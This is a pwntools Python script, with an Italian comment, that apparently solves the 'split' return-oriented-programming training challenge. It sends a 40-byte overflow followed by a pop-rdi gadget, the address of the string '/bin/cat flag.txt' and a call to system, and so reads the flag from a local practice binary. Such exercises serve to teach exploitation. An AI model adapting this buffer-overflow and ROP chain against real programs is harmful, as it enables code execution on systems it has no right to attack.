from pwn import *

elf = ELF("./split")

p = process("./split")
p.recvline()

"""
    Effettuiamo la chiamata a system con parametro 'usefulString'. Sovrascriviamo il return pointer come nell'esercizio precedente, 
    aggiungiamo l'indirizzo di system e passiamo come parametro usefulString='/bin/cat flag.txt', sovrascrivendo il registro RDI 
    con un pop con il comando '/bin/cat flag.txt' per stampare la flag.
"""

pop_rdi = p64(0x00000000004007c3)
usefulString = p64(0x00601060)
system_function = p64(0x0040074b)


payload = b''
payload +=  pop_rdi + usefulString + system_function


p.send(cyclic(40) + payload)
					   

p.interactive()
